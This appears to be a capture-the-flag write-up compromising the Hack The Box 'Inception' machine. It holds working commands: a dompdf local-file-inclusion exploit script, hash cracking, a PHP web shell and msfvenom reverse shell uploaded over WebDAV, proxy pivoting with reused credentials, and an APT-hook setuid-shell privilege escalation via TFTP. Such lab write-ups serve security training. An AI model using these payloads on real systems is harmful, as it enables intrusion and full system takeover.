# Target
| Category          | Details                                                                                                               |
|-------------------|-----------------------------------------------------------------------------------------------------------------------|
| 📝 **Name**       | [Inception](https://app.hackthebox.com/machines/Inception)                                                            |  
| 🏷 **Type**       | HTB Machine                                                                                                           |
| 🖥 **OS**         | Linux                                                                                                                 |
| 🎯 **Difficulty** | Medium                                                                                                                |
| 📁 **Tags**       | [CVE-2014-2383](https://nvd.nist.gov/vuln/detail/CVE-2014-2383), webdav, squid, proxychains, pivoting, tftp, apt hook |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Inception]
└─$ nmap -sS -sC -sV -p- $TARGET    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-19 15:54 +0100
Nmap scan report for 10.129.4.199
Host is up (0.027s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.69 seconds
```

#### Discover information about `dompdf` potentially installed on target
```
┌──(magicrc㉿perun)-[~/Tools]
└─$ curl -s http://$TARGET | tail -n 1
<!-- Todo: test dompdf on php 7.x -->
```

#### Confirm `dompdf 0.6.0` installed on target
```
┌──(magicrc㉿perun)-[~/Tools]
└─$ curl -s http://$TARGET/dompdf/VERSION
0.6.0
```
This version is vulnerable to [CVE-2014-2383](https://nvd.nist.gov/vuln/detail/CVE-2014-2383)

#### Confirm LFI vulnerability
```
┌──(magicrc㉿perun)-[~/attack/HTB Inception]
└─$ curl -s http://$TARGET/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd | grep -oP '\[\(\K.*?(?=\)\])' | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash
```

#### Prepare `lfi.sh` exploit
```
┌──(magicrc㉿perun)-[~/attack/HTB Inception]
└─$ { cat <<'EOF'> lfi.sh
curl -s http://$TARGET/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=$1 | grep -oP '\[\(\K.*?(?=\)\])' | base64 -d
EOF
} && chmod +x lfi.sh
```

#### Discover `/webdav_test_inception` endpoint in Apache sites configuration
```
┌──(magicrc㉿perun)-[~/attack/HTB Inception]
└─$ ./lfi.sh /etc/apache2/sites-enabled/000-default.conf | sed -e 's/#.*//' -e '/^[[:space:]]*$/d'
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        Alias /webdav_test_inception /var/www/html/webdav_test_inception
        <Location /webdav_test_inception>
                Options FollowSymLinks
                DAV On
                AuthType Basic
                AuthName "webdav test credential"
                AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
                Require valid-user
        </Location>
</VirtualHost>
```
This virtual host seems to be WebDAV.

#### Access WebDAV credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Inception]
└─$ ./lfi.sh /var/www/html/webdav_test_inception/webdav.passwd                                    
webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
```

#### Crack WebDAV password
```
┌──(magicrc㉿perun)-[~/attack/HTB Inception]
└─$ hashcat -m 1600 '$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0' /usr/share/wordlists/rockyou.txt --quiet --show
$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0:babygurl69
```

#### Use `davtest` and discovered credentials to enumerate WebDAV 
```
┌──(magicrc㉿perun)-[~/attack/HTB Inception]
└─$ davtest -url http://$TARGET/webdav_test_inception/ -auth webdav_tester:babygurl69 -quiet

/usr/bin/davtest Summary:
Created: http://10.129.13.36/webdav_test_inception/DavTestDir_5hzMvgkAhHK
PUT File: http://10.129.13.36/webdav_test_inception/DavTestDir_5hzMvgkAhHK/davtest_5hzMvgkAhHK.txt
PUT File: http://10.129.13.36/webdav_test_inception/DavTestDir_5hzMvgkAhHK/davtest_5hzMvgkAhHK.jhtml
PUT File: http://10.129.13.36/webdav_test_inception/DavTestDir_5hzMvgkAhHK/davtest_5hzMvgkAhHK.asp
PUT File: http://10.129.13.36/webdav_test_inception/DavTestDir_5hzMvgkAhHK/davtest_5hzMvgkAhHK.shtml
PUT File: http://10.129.13.36/webdav_test_inception/DavTestDir_5hzMvgkAhHK/davtest_5hzMvgkAhHK.html
PUT File: http://10.129.13.36/webdav_test_inception/DavTestDir_5hzMvgkAhHK/davtest_5hzMvgkAhHK.cgi
PUT File: http://10.129.13.36/webdav_test_inception/DavTestDir_5hzMvgkAhHK/davtest_5hzMvgkAhHK.jsp
PUT File: http://10.129.13.36/webdav_test_inception/DavTestDir_5hzMvgkAhHK/davtest_5hzMvgkAhHK.php
PUT File: http://10.129.13.36/webdav_test_inception/DavTestDir_5hzMvgkAhHK/davtest_5hzMvgkAhHK.aspx
PUT File: http://10.129.13.36/webdav_test_inception/DavTestDir_5hzMvgkAhHK/davtest_5hzMvgkAhHK.pl
PUT File: http://10.129.13.36/webdav_test_inception/DavTestDir_5hzMvgkAhHK/davtest_5hzMvgkAhHK.cfm
Executes: http://10.129.13.36/webdav_test_inception/DavTestDir_5hzMvgkAhHK/davtest_5hzMvgkAhHK.txt
Executes: http://10.129.13.36/webdav_test_inception/DavTestDir_5hzMvgkAhHK/davtest_5hzMvgkAhHK.html
Executes: http://10.129.13.36/webdav_test_inception/DavTestDir_5hzMvgkAhHK/davtest_5hzMvgkAhHK.php
```
`davtest` enumeration shows that we can upload and execute PHP code.

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Inception]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
```

#### Generate, upload and execute reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Inception]
└─$ msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -o reverse_shell.php && \
curl -s -X PUT http://$TARGET/webdav_test_inception/reverse_shell.php -u webdav_tester:babygurl69 --data-binary @reverse_shell.php -o /dev/null && \
curl http://$TARGET/webdav_test_inception/reverse_shell.php -u webdav_tester:babygurl69
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 2730 bytes
Saved as: reverse_shell.php
```
Unfortunately no reverse shell connection has been received.  

#### Upload command executor
```
┌──(magicrc㉿perun)-[~/attack/HTB Inception]
└─$ echo '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' > cmd.php && \
curl -s -X PUT http://$TARGET/webdav_test_inception/cmd.php -u webdav_tester:babygurl69 --data-binary @cmd.php -o /dev/null
curl http://$TARGET/webdav_test_inception/cmd.php?cmd=id -u webdav_tester:babygurl69
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```
We were able to execute `id` command.

#### Prepare `cmd.sh` exploit
```
┌──(magicrc㉿perun)-[~/attack/HTB Inception]
└─$ { cat <<'EOF'> cmd.sh
CMD=$(echo "$1 2>&1" | jq -sRr @uri)
curl http://$TARGET/webdav_test_inception/cmd.php?cmd=$CMD -u webdav_tester:babygurl69
EOF
} && chmod +x cmd.sh
```

#### Check connectivity to the attacker machine
```
┌──(magicrc㉿perun)-[~/attack/HTB Inception]
└─$ ./cmd.sh "ping -c 4 $LHOST"                                                 
<pre>PING 10.10.16.193 (10.10.16.193) 56(84) bytes of data.

--- 10.10.16.193 ping statistics ---
4 packets transmitted, 0 received, 100% packet loss, time 3000ms

</pre>
```
We have also checked TCP and UDP, and it seems that egress traffic (ICMP, TCP, and UDP) from the target host appears to be restricted. 

#### Upload and run `linpeas.sh` on target
```
┌──(magicrc㉿perun)-[~/attack/HTB Inception]
└─$ curl -s -X PUT http://$TARGET/webdav_test_inception/linpeas.sh -u webdav_tester:babygurl69 --data-binary @linpeas.sh -o /dev/null && \
./cmd.sh 'chmod +x linpeas.sh' && \
./cmd.sh './linpeas.sh > peas.log &'
<pre></pre><pre></pre>
```

`linpeas` were able to discover plaintext password in WordPress configuration.
```
/var/www/html/wordpress_4.8.3/wp-config.php:define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');
```

#### Discover SSH server running on target 
```
┌──(magicrc㉿perun)-[~/attack/HTB Inception]
└─$ ./cmd.sh 'netstat -natup'
<pre>(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::3128                 :::*                    LISTEN      -               
tcp6       0      0 192.168.0.10:80         192.168.0.1:54300       ESTABLISHED -               
udp        0      0 192.168.0.10:50223      1.1.1.1:53              ESTABLISHED 11038/bash      
udp        0      0 0.0.0.0:35732           0.0.0.0:*                           -               
udp6       0      0 ::1:51925               ::1:52524               ESTABLISHED -               
udp6       0      0 :::38119                :::*                                -               
udp6       0      0 ::1:52524               ::1:51925               ESTABLISHED -               
</pre>
```
The SSH service is bound to `0.0.0.0`; however, it was not detected during the Nmap scan, suggesting that network traffic may be filtered. Additionally, a Squid HTTP proxy is running on the target, which could potentially be leveraged for pivoting.

#### Check if SSH server is accessible via Squid proxy
```
┌──(magicrc㉿perun)-[~/attack/HTB Inception]
└─$ curl --proxy http://$TARGET:3128 http://127.0.0.1:22 
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
Protocol mismatch.
```

#### Add Squid proxy to proxychains configuration
```
cat <<EOF> /home/magicrc/.proxychains/proxychains.conf
[ProxyList]
http $TARGET 3128
EOF
```

#### Access target over SSH via Squid proxy using `cobb:VwPddNh7xMZyDQoByQL4` credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Inception]
└─$ proxychains ssh cobb@127.0.0.1
[proxychains] config file found: /home/magicrc/.proxychains/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Dynamic chain  ...  10.129.13.36:3128  ...  127.0.0.1:22  ...  OK
cobb@127.0.0.1's password: 
<SNIP>
cobb@Inception:~$ id
uid=1000(cobb) gid=1000(cobb) groups=1000(cobb),27(sudo)
```

#### Capture user flag
```
cobb@Inception:~$ cat /home/cobb/user.txt 
99b3d64d1b413bee7713276b07e95ad2
```

### Root flag

#### List allowed sudo commands
```
cobb@Inception:~$ sudo -l
Matching Defaults entries for cobb on Inception:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobb may run the following commands on Inception:
    (ALL : ALL) ALL
```

#### Escalate to `root` user using `sudo`
```
cobb@Inception:~$ sudo su
root@Inception:/home/cobb# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture root flag
```
root@Inception:~# cat /root/root.txt
You're waiting for a train. A train that will take you far away. Wake up to find root.txt.
```
Flag seems to be somewhere else.

#### Check if we are operating inside docker container
```
root@Inception:~# cat /proc/1/cgroup
11:hugetlb:/
10:cpuset:/
9:net_cls,net_prio:/
8:memory:/
7:pids:/
6:cpu,cpuacct:/
5:blkio:/
4:perf_event:/
3:freezer:/
2:devices:/init.scope
1:name=systemd:/init.scope
```
This machine does not seem to be docker container.

#### Check network interfaces
```
root@Inception:/# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:28:53:63 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.168.0.10/24 brd 192.168.0.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe28:5363/64 scope link 
       valid_lft forever preferred_lft forever
```

#### Ping sweep `192.168.0.1/24` subnet
We have uploaded `nmap` over SSH.
```
root@Inception:/home/cobb# ./nmap -sn 192.168.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2026-03-22 10:41 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000027s latency).
MAC Address: FE:6F:20:F4:33:B0 (Unknown)
Nmap scan report for 192.168.0.10
Host is up.
Nmap done: 256 IP addresses (2 hosts up) scanned in 28.02 seconds
```
`192.168.0.1` has been discovered.

#### Scan `192.168.0.1` with `nmap`
```
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2026-03-22 10:47 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.0000070s latency).
Not shown: 1202 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain
MAC Address: FE:6F:20:F4:33:B0 (Unknown)
```

#### Try reusing `cobb:VwPddNh7xMZyDQoByQL4` credentials to access `192.168.0.1` over SSH
```
cobb@Inception:~$ ssh cobb@192.168.0.1
cobb@192.168.0.1's password: 
<SNIP>
cobb@Inception:~$ id
uid=1000(cobb) gid=1000(cobb) groups=1000(cobb)
```

#### Discover `apt update` running every 5 minutes as `root`
```
cobb@Inception:~$ cat /etc/crontab 
<SNIP>
*/5 *   * * *   root    apt update 2>&1 >/var/log/apt/custom.log
<SNIP>
```
If we could write to `/etc/apt/apt.conf.d/` or modify any file in this directory we could add APT hook to spawn root shell. 

#### Check `/etc/apt/apt.conf.d/` write permissions
```
cobb@Inception:~$ ls -la /etc/apt/apt.conf.d/
total 56
drwxr-xr-x 2 root root 4096 Mar 22 15:00 .
drwxr-xr-x 6 root root 4096 Aug 10  2022 ..
-rw-r--r-- 1 root root   49 Oct 30  2017 00aptitude
-rw-r--r-- 1 root root   82 Oct 30  2017 00CDMountPoint
-rw-r--r-- 1 root root   40 Oct 30  2017 00trustcdrom
-rw-r--r-- 1 root root  769 Apr 14  2016 01autoremove
-r--r--r-- 1 root root 2920 Aug 10  2022 01autoremove-kernels
-rw-r--r-- 1 root root   42 Apr 14  2016 01-vendor-ubuntu
-rw-r--r-- 1 root root  129 May 24  2016 10periodic
-rw-r--r-- 1 root root  108 May 24  2016 15update-stamp
-rw-r--r-- 1 root root   85 May 24  2016 20archive
-rw-r--r-- 1 root root  182 Nov 10  2015 70debconf
-rw-r--r-- 1 root root  305 May 24  2016 99update-notifier
```
Unfortunately we do not have write permissions.

#### Discover TFTP running on target
```
cobb@Inception:~$ netstat -natup
<SNIP>          
udp        0      0 0.0.0.0:69              0.0.0.0:*                           -               
<SNIP>
```

#### Check TFTP configuration
```
cobb@Inception:~$ cat /etc/default/tftpd-hpa
# /etc/default/tftpd-hpa

TFTP_USERNAME="root"
TFTP_DIRECTORY="/"
TFTP_ADDRESS=":69"
TFTP_OPTIONS="--secure --create"
```
This configuration gives us ability upload (create) any file.

#### Prepare root shell spawning APT hook and upload it to `/etc/apt/apt.conf.d/`
```
cobb@Inception:~$ echo "APT::Update::Pre-Invoke {\"bash -c 'cp /bin/bash /tmp/root_shell && chmod +s /tmp/root_shell'\"}" > 00pwn
cobb@Inception:~$ tftp 127.0.0.1
tftp> put 00pwn /etc/apt/apt.conf.d/00pwn
```
Wait up to 5 minutes for root shell to be spawned.

#### Use `/tmp/root_shell` to escalate to `root` user
```
cobb@Inception:~$ /tmp/root_shell -p
root_shell-4.3# id
uid=1000(cobb) gid=1000(cobb) euid=0(root) egid=0(root) groups=0(root),1000(cobb)
```

#### Capture root flag
```
root_shell-4.3# cat /root/root.txt 
3c92ba9d34f7353b25d2cf76a7c0320b
```
